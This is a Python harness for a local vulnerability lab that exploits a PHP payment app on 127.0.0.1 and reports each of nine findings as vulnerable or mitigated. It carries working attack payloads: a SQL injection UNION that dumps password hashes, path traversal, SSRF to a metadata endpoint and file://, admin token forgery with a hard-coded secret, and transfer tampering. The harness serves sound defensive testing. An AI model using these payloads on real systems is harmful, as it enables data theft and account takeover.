#!/usr/bin/env python3
"""PayLoop vulnerability lab harness.

Boots an app tree on a throw-away SQLite DB, runs one exploit per finding (F1..F9) and reports
VULNERABLE or MITIGATED with evidence. Stdlib only. Everything talks to 127.0.0.1.

  python3 tests/lab.py --app app --expect vulnerable          # baseline must be exploitable
  python3 tests/lab.py --app build/fixed --expect mitigated   # fixed tree must resist every exploit
  python3 tests/lab.py --app app --only F1,F4 --keep-log /tmp/baseline.jsonl
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.server
import json
import os
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

INTERNAL_MARKER = "INTERNAL-ONLY-METADATA-CREDS"
DEV_SECRET = "payloop-dev-secret-2024"  # the value hard-coded in the baseline (F6)


@dataclass
class Result:
    fid: str
    title: str
    vulnerable: bool
    evidence: str


# ------------------------------------------------------------------ http helpers
class Client:
    def __init__(self, base: str):
        self.base = base

    def call(self, method, path, body=None, token=None, headers=None, raw=None):
        h = {"Accept": "application/json"}
        data = None
        if raw is not None:
            data = raw.encode()
            h["Content-Type"] = "application/json"
        elif body is not None:
            data = json.dumps(body).encode()
            h["Content-Type"] = "application/json"
        if token:
            h["Authorization"] = f"Bearer {token}"
        h.update(headers or {})
        req = urllib.request.Request(self.base + path, data=data, method=method, headers=h)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                status, text = r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            status, text = e.code, e.read().decode(errors="replace")
        try:
            parsed = json.loads(text)
        except ValueError:
            parsed = None
        return status, text, parsed

    def login(self, user, pw, ip="127.0.0.1"):
        s, _, j = self.call("POST", "/login", {"username": user, "password": pw}, headers={"X-Forwarded-For": ip})
        if s != 200 or not j:
            raise RuntimeError(f"login failed for {user}: {s}")
        return j["token"]


# ------------------------------------------------------------------ the nine checks
def f1_sqli(c: Client, ctx):
    t = c.login("alice", "alice-demo-pw")
    payload = "zzz%' UNION SELECT id,1,1,1,username||':'||pass_hash,'x' FROM users--"
    s, text, j = c.call("GET", "/statement?wallet=1&q=" + urllib.parse.quote(payload), token=t)
    leaked = s == 200 and j and any("admin:" in str(i.get("note", "")) for i in j.get("items", []))
    return leaked, f"HTTP {s}; users table rows in statement: {bool(leaked)}"


def f2_idor(c: Client, ctx):
    t = c.login("alice", "alice-demo-pw")
    s, _, j = c.call("GET", "/wallet?id=2", token=t)
    bad = s == 200 and j and j.get("owner") == "bob"
    return bad, f"alice reads wallet 2 -> HTTP {s}" + (f", owner={j.get('owner')}, balance={j.get('balance_minor')}" if bad else "")


def f3_traversal(c: Client, ctx):
    t = c.login("alice", "alice-demo-pw")
    s, _, j = c.call("GET", "/receipt?file=" + urllib.parse.quote("../internal/notes.txt"), token=t)
    bad = s == 200 and j and "INTERNAL ONLY" in j.get("content", "")
    return bad, f"file=../internal/notes.txt -> HTTP {s}, internal file read: {bool(bad)}"


def f4_ssrf(c: Client, ctx):
    t = c.login("alice", "alice-demo-pw")
    url = f"http://127.0.0.1:{ctx['internal_port']}/latest/meta-data/iam"
    s, _, j = c.call("POST", "/partner/webhook-test", {"url": url}, token=t)
    via_http = s == 200 and j and INTERNAL_MARKER in j.get("body_preview", "")
    s2, _, j2 = c.call("POST", "/partner/webhook-test", {"url": "file:///etc/hostname"}, token=t)
    via_file = s2 == 200 and j2 and bool(j2.get("body_preview", "").strip())
    return bool(via_http or via_file), f"loopback http -> HTTP {s} (internal data reflected: {bool(via_http)}); file:// -> HTTP {s2} (read: {bool(via_file)})"


def f5_hashing(c: Client, ctx):
    con = sqlite3.connect(ctx["db"])
    h = con.execute("select pass_hash from users where username='alice'").fetchone()[0]
    con.close()
    bad = re.fullmatch(r"[0-9a-f]{32}", h) is not None
    return bad, f"stored hash format: {'32-hex (unsalted MD5)' if bad else h.split('$')[1] + ' (salted, memory-hard)' if h.startswith('$') else 'unknown'}"


def f6_forged_token(c: Client, ctx):
    def b64(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    payload = b64(json.dumps({"sub": 5, "usr": "admin", "role": "admin", "exp": int(time.time()) + 600}).encode())
    sig = hmac.new(DEV_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    s, _, j = c.call("GET", "/admin/users", token=f"{payload}.{sig}")
    bad = s == 200 and j and "users" in j
    return bad, f"admin token forged with the committed secret -> HTTP {s}" + (f", {len(j['users'])} users listed" if bad else "")


def f7_bruteforce(c: Client, ctx):
    codes = [c.call("POST", "/login", {"username": "dave", "password": f"wrong-{i}"}, headers={"X-Forwarded-For": "198.51.100.9"})[0] for i in range(12)]
    throttled = 429 in codes
    # user enumeration: compare responses for a real user vs an unknown user
    _, _, a = c.call("POST", "/login", {"username": "carol", "password": "nope"}, headers={"X-Forwarded-For": "198.51.100.21"})
    _, _, b = c.call("POST", "/login", {"username": "no-such-user-xyz", "password": "nope"}, headers={"X-Forwarded-For": "198.51.100.22"})
    enum = (a or {}).get("error") != (b or {}).get("error")
    return (not throttled) or enum, f"12 wrong passwords -> {sorted(set(codes))} (429 seen: {throttled}); enumeration via error text: {enum}"


def f8_transfer(c: Client, ctx):
    ta = c.login("alice", "alice-demo-pw")
    s_neg, _, _ = c.call("POST", "/transfer", {"from_wallet": 1, "to_wallet": 2, "amount_minor": -5000}, token=ta, headers={"Idempotency-Key": "lab-neg-0001"})
    tb = c.login("bob", "bob-demo-pw")
    s_over, _, _ = c.call("POST", "/transfer", {"from_wallet": 2, "to_wallet": 3, "amount_minor": 9_000_000}, token=tb, headers={"Idempotency-Key": "lab-over-0001"})
    tc = c.login("carol", "carol-demo-pw")
    before = c.call("GET", "/wallet?id=3", token=tc)[2]["balance_minor"]
    for _ in range(2):
        c.call("POST", "/transfer", {"from_wallet": 3, "to_wallet": 1, "amount_minor": 1000}, token=tc, headers={"Idempotency-Key": "lab-replay-0001"})
    after = c.call("GET", "/wallet?id=3", token=tc)[2]["balance_minor"]
    moved = before - after
    bad = s_neg < 300 or s_over < 300 or moved == 2000
    return bad, f"negative amount -> HTTP {s_neg}; overdraft -> HTTP {s_over}; same key sent twice moved GHS {moved/100:.2f} (expected 10.00)"


def f9_errors(c: Client, ctx):
    s, text, j = c.call("POST", "/login", raw="{")
    leaked = s == 500 and (bool(j) and "trace" in j or ".php" in text)
    return leaked, f"malformed JSON -> HTTP {s}; stack trace / file paths in body: {leaked}"


CHECKS = {
    "F1": ("SQL injection in statement search", f1_sqli),
    "F2": ("IDOR on wallet lookup", f2_idor),
    "F3": ("Path traversal in receipt download", f3_traversal),
    "F4": ("SSRF in partner webhook test", f4_ssrf),
    "F5": ("Unsalted MD5 password storage", f5_hashing),
    "F6": ("Hard-coded token signing secret", f6_forged_token),
    "F7": ("No login throttling + user enumeration", f7_bruteforce),
    "F8": ("Transfer integrity (negative, overdraft, replay)", f8_transfer),
    "F9": ("Stack traces returned to clients", f9_errors),
}


# ------------------------------------------------------------------ runner
def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class _Internal(http.server.BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        body = INTERNAL_MARKER.encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def run(app: Path, only=None, keep_log: Path | None = None, quiet=False) -> list[Result]:
    only = only or list(CHECKS)
    tmp = Path(tempfile.mkdtemp(prefix="payloop-lab-"))
    work = tmp / "app"
    shutil.copytree(app, work, ignore=shutil.ignore_patterns("var"))
    env = dict(os.environ,
               PAYLOOP_DB=str(tmp / "payloop.sqlite"),
               PAYLOOP_LOG=str(tmp / "payloop.jsonl"),
               PAYLOOP_TOKEN_SECRET=os.urandom(24).hex(),
               PAYLOOP_WEBHOOK_ALLOWLIST="partner.example.test",
               PAYLOOP_TRUSTED_PROXY="127.0.0.1")
    subprocess.run(["php", "db/seed.php"], cwd=work, env=env, check=True, capture_output=True)

    internal = http.server.HTTPServer(("127.0.0.1", 0), _Internal)
    threading.Thread(target=internal.serve_forever, daemon=True).start()

    port = _free_port()
    srv = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", "public", "public/index.php"],
                           cwd=work, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    results: list[Result] = []
    try:
        client = Client(f"http://127.0.0.1:{port}")
        for _ in range(50):
            try:
                if client.call("GET", "/health")[0] == 200:
                    break
            except Exception:
                time.sleep(0.1)
        else:
            raise RuntimeError("app did not start")
        ctx = {"internal_port": internal.server_address[1], "db": str(tmp / "payloop.sqlite")}
        for fid in only:
            title, fn = CHECKS[fid]
            vuln, evidence = fn(client, ctx)
            results.append(Result(fid, title, bool(vuln), evidence))
    finally:
        srv.terminate()
        srv.wait(timeout=5)
        internal.shutdown()
        if keep_log and (tmp / "payloop.jsonl").exists():
            shutil.copy(tmp / "payloop.jsonl", keep_log)
        shutil.rmtree(tmp, ignore_errors=True)
    return results


def print_report(results: list[Result]) -> None:
    print(f"{'ID':<4} {'RESULT':<11} FINDING")
    for r in results:
        print(f"{r.fid:<4} {'VULNERABLE' if r.vulnerable else 'MITIGATED':<11} {r.title}")
        print(f"       {r.evidence}")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--app", required=True, type=Path, help="app directory containing public/ and src/")
    ap.add_argument("--only", help="comma separated finding ids, e.g. F1,F4")
    ap.add_argument("--expect", choices=["vulnerable", "mitigated"], help="exit non-zero if any selected check disagrees")
    ap.add_argument("--keep-log", type=Path, help="copy the app's JSONL security log here after the run")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    a = ap.parse_args()
    only = [x.strip().upper() for x in a.only.split(",")] if a.only else None
    results = run(a.app, only, a.keep_log)
    if a.json:
        print(json.dumps([r.__dict__ for r in results], indent=2))
    else:
        print_report(results)
    if a.expect == "vulnerable":
        return 0 if all(r.vulnerable for r in results) else 1
    if a.expect == "mitigated":
        return 0 if not any(r.vulnerable for r in results) else 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
